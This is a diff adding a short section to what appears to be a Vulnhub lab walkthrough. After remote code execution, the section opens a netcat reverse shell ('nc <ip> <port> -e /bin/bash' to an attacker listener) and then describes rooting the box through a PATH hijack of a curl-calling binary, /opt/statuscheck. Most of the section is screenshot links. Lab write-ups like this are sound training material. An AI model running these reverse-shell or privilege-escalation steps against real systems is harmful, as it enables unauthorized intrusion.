@@ -62,8 +62,29 @@ Success escalate to RCE
 
 <img width="958" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/06254711-373f-45b6-a943-31fbdff57f8c">
 
+Time to get intractive shell
 
+command attacker : nc -lnvp 4242
+command victim : nc <ip> <port> -e /bin/bash
+  
+<img width="956" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/46ce5536-1eaa-4cb0-b65b-59e346cbe729">
 
+<img width="432" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/c8246476-0add-4569-b1a7-2a4be8afbb3a">
+
+found interesting binary
+
+<img width="490" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/3f4677a1-449b-4ce0-9026-3a6ccdc8ce2b">
+  
+trying to modify path variables for /opt/statuscheck (looks like curl binary)
+
+<img width="447" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/633651a6-3516-417f-9213-1703e6f3f7d5">
+
+  
+Success Rooting
+  
+<img width="520" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/c7c71c48-c053-430c-938b-bd4b3e5ac1e3">
+
+<img width="787" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/bdbe4b2f-3e87-408b-bc6e-df2355eeb76e">
 
 
 
